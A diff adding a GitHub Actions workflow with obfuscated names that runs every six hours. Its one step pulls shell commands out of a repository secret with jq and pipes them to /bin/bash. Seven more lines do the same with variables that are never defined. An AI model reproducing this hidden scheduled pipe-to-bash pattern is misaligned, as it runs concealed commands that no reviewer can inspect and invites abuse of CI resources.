@@ -1,0 +1,24 @@
+name: shougangqiangg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shougangqiangg
+        env:
+          q3456: ${{ secrets.q3456 }}
+        run: |
+          echo $q3456 | jq -r .t22146 | /bin/bash
+          echo $mdy689 | jq -r .sd421 | /bin/bash
+          echo $h5164 | jq -r .slui80164 | /bin/bash
+          echo $wr23870 | jq -r .t63 | /bin/bash
+          echo $isf70312 | jq -r .okrr57 | /bin/bash
+          echo $kojlk7 | jq -r .bti77 | /bin/bash
+          echo $cm71429 | jq -r .oe6549 | /bin/bash
+          echo $pk9301 | jq -r .ctrq5 | /bin/bash
+
